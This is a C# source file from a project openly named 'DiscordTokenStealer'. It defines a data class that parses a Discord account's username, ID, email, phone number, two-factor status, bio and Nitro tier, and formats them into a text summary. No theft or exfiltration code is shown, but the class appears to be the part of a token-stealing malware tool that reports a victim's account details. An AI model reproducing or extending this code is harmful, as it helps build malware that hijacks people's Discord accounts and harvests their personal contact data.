using System.Text;
using System.Text.Json.Serialization;

namespace DiscordTokenStealer.Discord
{
    public class DiscordUser
    {
        [JsonPropertyName("username")] public string Username { get; set; }
        [JsonPropertyName("discriminator")] public string Discriminator { get; set; }
        [JsonPropertyName("id")] public string Id { get; set; }
        [JsonPropertyName("bio")] public string AboutMe { get; set; }
        [JsonPropertyName("locale")] public string Locale { get; set; }
        [JsonPropertyName("mfa_enabled")] public bool TwoFactor { get; set; }
        [JsonPropertyName("email")] public string Email { get; set; }
        [JsonPropertyName("verified")] public bool EmailVerified { get; set; }
        [JsonPropertyName("phone")] public string? PhoneNumber { get; set; }
        [JsonPropertyName("premium_type")] public int? _nitro { get; set; }
        public DiscordNitroType Nitro
        {
            get
            {
                return _nitro.HasValue ? (DiscordNitroType)_nitro.Value : DiscordNitroType.None;
            }
        }

        public string Summary
        {
            get
            {
                StringBuilder summary = new StringBuilder();
                summary.AppendLine($"\t\tUser: {Username}#{Discriminator} ({Id})");
                summary.AppendLine($"\t\tEmail: {Email}");
                if (PhoneNumber != null)
                {
                    summary.AppendLine($"\t\tPhone: {PhoneNumber}");
                }
                summary.AppendLine($"\t\tLocale: {Locale}");
                summary.AppendLine($"\t\tVerified: {EmailVerified}");
                summary.AppendLine($"\t\tTwo-Factor: {TwoFactor}");
                summary.AppendLine($"\t\tAbout Me: {AboutMe}");
                summary.AppendLine($"\t\tNitro: {Nitro}");
                return summary.ToString();
            }
        }
    }
}
